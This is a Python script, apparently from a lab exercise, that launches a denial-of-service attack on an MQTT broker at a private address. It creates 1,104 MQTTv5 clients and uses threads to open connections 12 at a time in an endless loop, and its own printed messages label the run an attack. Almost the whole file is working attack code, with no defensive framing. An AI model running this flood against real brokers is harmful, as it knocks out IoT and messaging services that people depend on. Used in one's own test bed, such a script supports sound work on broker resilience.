# -*- coding: utf-8 -*-
"""
Created on Tue Sep  6 21:45:56 2022

@author: james
"""

import threading
import random
import paho.mqtt.client as mqtt
import time
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes

################################################
###### parametros DE CONEXION
clients=[] #array clientes
broker = '192.168.100.20'
port = 1883

nclients=1104 #NUM CONEXIONES/clientes
DoSClients=12
keepalive=60
sesionExpira=30
conn_properties=Properties(PacketTypes.CONNECT)
################################################
print("DESCRIPCION DEL ATAQUE:")
print("servidor MQTT: ", broker)
print("numero de puerto: ", port)
print("OPCIONES DE CONEXION")
print("keepalive:",keepalive)
print("timeOut:",sesionExpira)
print("mensaje willPayload: ","")

################################################
#creacion de clientes
print("CREANDO CLIENTES....")
for i  in range(nclients):
    cname=f'python-mqtt-Cliente__{random.randint(0, 1000000000000000000)}' #funcion para crear id aleatorio
    cname=cname+str(i)
    client=mqtt.Client(cname, protocol=mqtt.MQTTv5)
    conn_properties=Properties(PacketTypes.CONNECT)
    conn_properties.SessionExpiryInterval = sesionExpira
    clients.append(client)
print("FIN, CREACION DE CLIENTES")
################################################

def conectar(client,**datos):
    serverBRK=datos['broker']
    puertoMQTT=datos['puerto']
    keepAlive=datos['keepAlv']
    propertiesOpt=datos['connProperties']
    print(client.connect(serverBRK, puertoMQTT, keepAlive, properties=propertiesOpt))
    

NUM_HILOS = nclients
#funcion multihilo
contadorAux=0
print("=====INICIANDO ATAQUE========")
while(contadorAux<92):
    print("=====Iterando========")
    for i in range(DoSClients):
        hilo = threading.Thread(target=conectar, args=(clients[i+(contadorAux*DoSClients)],),
                                    kwargs={'broker':broker, 
                                            'puerto': port, 
                                            'keepAlv': keepalive, 
                                            'connProperties': conn_properties})
        hilo.start()
    time.sleep(0.40)
    print("====fin iteracion i")
    contadorAux=contadorAux+1
    if(contadorAux==92):
        contadorAux=0
        
        
        
        
        
        
        
        
        
        
        